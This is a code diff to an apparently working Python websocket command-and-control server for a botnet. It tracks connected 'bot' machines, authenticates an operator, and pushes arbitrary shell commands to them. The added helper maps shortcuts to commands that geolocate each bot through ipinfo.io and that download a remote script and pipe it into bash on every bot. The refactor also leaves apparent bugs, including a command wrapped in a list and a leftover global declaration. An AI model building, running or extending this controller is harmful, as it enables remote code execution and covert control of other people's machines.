@@ -15,7 +15,6 @@ from websockets.exceptions import ConnectionClosedError
 
 
 logger = logging.getLogger(__name__)
-bot_length = 1
 
 CLI_OPTIONS  = f'{termcolor.colored("Enter:","red")}\n'
 CLI_OPTIONS += f'* "{termcolor.colored("0","yellow",attrs=["bold"])}" {termcolor.colored("- to print bot clients collection","red")}\n'
@@ -32,7 +31,6 @@ def isNotListed(ip: str, ip_list: Bot) -> bool:
     return True
 
 
-
 class Context:
     def __init__(self, plain_password: str):
         self.pass_hash = hash_sha256(plain_password)
@@ -47,10 +45,9 @@ class Context:
 
     async def add_bot(self, ws: WebSocketConn):
         # First the client sends logged in user
-        global bot_length
         user = await ws.recv()
         try:
-            id = bot_length
+            id = None
             remote_adr, _ = ws.remote_address
             new_bot = Bot(
                 id,
@@ -61,7 +58,7 @@ class Context:
             if isNotListed(new_bot.remote_address, self.bots):
                 self.bots.append(new_bot)
                 logger.info(f"Added {new_bot}")
-                bot_length += 1
+                new_bot.idx = self.bots.index(new_bot) + 1
                 print(f'Longueur liste bot : {len(self.bots)}')
                 #print(f"self.bots[0] : {self.bots[0]}")
                 #print(f"self.bots : {self.bots}")
@@ -76,17 +73,15 @@ class Context:
             return None
 
     def remove_bot_client(self, bot: Bot):
-        try:
-            if bot in self.bots:
-                self.bots.remove(bot)
-                bot_length -= 1
-                logger.info(f"{bot} removed")
-                logger.info(f"Bots : {len(self.bots)}")
-        except UnboundLocalError:
-            pass
+        if bot in self.bots:
+            self.bots.remove(bot)
+            logger.info(f"{bot} removed")
+            logger.info(f"Bots : {len(self.bots)}")
+
     def get_database_summary(self) -> str:
-        x = PrettyTable()
+        list_bot = []
         bot_len = len(self.bots)
+        x = PrettyTable()
         x.field_names = [termcolor.colored("Index","yellow",attrs=["bold"]), termcolor.colored("Remote address","yellow",attrs=["bold"]), termcolor.colored("Logged as","yellow",attrs=["bold"])]
         for bot in self.bots:
             x.add_row([termcolor.colored(bot.idx,"yellow",attrs=["bold"]), termcolor.colored(bot.remote_address,"yellow",attrs=["bold"]), termcolor.colored(bot.user,"yellow",attrs=["bold"])])
@@ -96,6 +91,18 @@ class Context:
 class CommandControl:
     def __init__(self, ctx: Context):
         self.ctx = ctx
+
+    def optionalCommands(self, cmd):
+        match cmd:
+            case "city":
+                return "curl http://ipinfo.io/$(curl ifconfig.io) | grep region | sed 's/.$//'"
+            case "neofetch":
+                return "curl https://raw.githubusercontent.com/Chocapikk/neofetch/master/neofetch | bash || neofetch"
+            
+            case default:
+                return None
+
+
 
     async def bot_authenticated(self, ws: WebSocketConn):
         pass_hash = await ws.recv()
@@ -116,14 +123,14 @@ class CommandControl:
 
     async def execute_commands(self, ws: WebSocketConn, idxs: List[int]):
         global bot_length
-        CLI_OPTIONS  = f'* {termcolor.colored("Send","red")} "{termcolor.colored("city", "yellow",attrs=["bold"])}" {termcolor.colored("to see current bot location","red")}\n'
+        CLI_OPTIONS  = f'\n* {termcolor.colored("Send","red")} "{termcolor.colored("city", "yellow",attrs=["bold"])}" {termcolor.colored("to see current bot location","red")}\n'
+        CLI_OPTIONS += f'* {termcolor.colored("Send","red")} "{termcolor.colored("neofetch", "yellow",attrs=["bold"])}" {termcolor.colored("to see a fancy terminal","red")}\n'
         CLI_OPTIONS += f'{termcolor.colored("Enter command : ","yellow", attrs=["bold"])}'
+
         await ws.send(CLI_OPTIONS)
         cmd = await ws.recv()
-        if cmd == "city":
-            cmd = "curl http://ipinfo.io/$(curl ifconfig.io) | grep region | sed 's/.$//'"
-        elif cmd == "neofetch":
-            cmd = "curl https://raw.githubusercontent.com/Chocapikk/neofetch/master/neofetch | bash || neofetch"
+        cmd = [ self.optionalCommands(cmd) if self.optionalCommands(cmd) != None else cmd ]
+        
         async def exec_command(bot_idx: int):
             cur_bot = self.ctx.get_bot(bot_idx)
             if not cur_bot:
@@ -158,10 +165,9 @@ class CommandControl:
             cmd = await ws.recv()
             if cmd.strip("\n").lower() == "exit":
                 break
-            elif cmd == "city":
-                cmd = "curl http://ipinfo.io/$(curl ifconfig.io) | grep region | sed 's/.$//'"
-            elif cmd == "neofetch":
-                cmd = "curl https://raw.githubusercontent.com/Chocapikk/neofetch/master/neofetch | bash || neofetch"
+            else:
+                cmd = [ self.optionalCommands(cmd) if self.optionalCommands(cmd) != None else cmd ]
+                
             stdout = await bot.send_command(cmd)
             if ws.closed or stdout is False:
                 self.ctx.remove_bot_client(bot)
